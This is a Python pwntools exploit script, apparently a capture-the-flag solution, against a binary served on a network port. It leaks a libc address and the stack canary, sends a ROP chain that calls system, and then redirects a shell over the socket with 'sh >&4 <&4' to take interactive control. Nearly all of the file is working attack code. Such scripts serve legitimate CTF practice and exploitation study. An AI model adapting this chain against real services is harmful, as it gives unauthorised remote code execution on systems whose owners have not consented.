#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import struct
import os
import sys

elfPath = "./chall"
libcPath = "./libc.so.6"
remoteAddr = "localhost"
remoteAddr = "172.16.5.102"
remotePort = 1337

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "debug"
    io = remote(remoteAddr, remotePort)
    #  libc = elf.libc
    if libcPath:
       libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value)) 
def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    p = lambda d: struct.pack('>i', d)
    io.send("RPCM")
    io.send(p(100))
    #  raw_input("DEBUG: ")
    io.send(p(0))
    io.send(p(-1))
    io.sendlineafter(">", "1")
    io.recvuntil("0x")
    libc.address = int(io.recvuntil("\n", drop = True), 16) + 1280 - libc.sym['puts']
    success("libc.address", libc.address)

    io.sendlineafter(">", "2")
    io.sendafter(">", '0' * 3)
    io.recvn(312)
    canary = io.recvn(8)
    print canary.encode('hex')

    pRdi = 0x0000000000021102 + libc.address
    pRdxRsi = 0x00000000001150c9 + libc.address

    #  raw_input("DEBUG")
    payload = 'a' * 312 + canary  
    payload = payload.ljust(328, '0') + p64(pRdi) + p64(4) + p64(pRdxRsi) + p64(0x100) + p64(elf.bss() + 0x500) + p64(elf.plt['read'])
    payload += p64(pRdi) + p64(elf.bss() + 0x500) + p64(libc.sym['system'])

    
    io.sendlineafter(">", "2")
    io.sendlineafter(">", payload)
    sleep(0.1)
    io.send("sh >&4 <&4\x00")

    io.interactive()
    io.close()
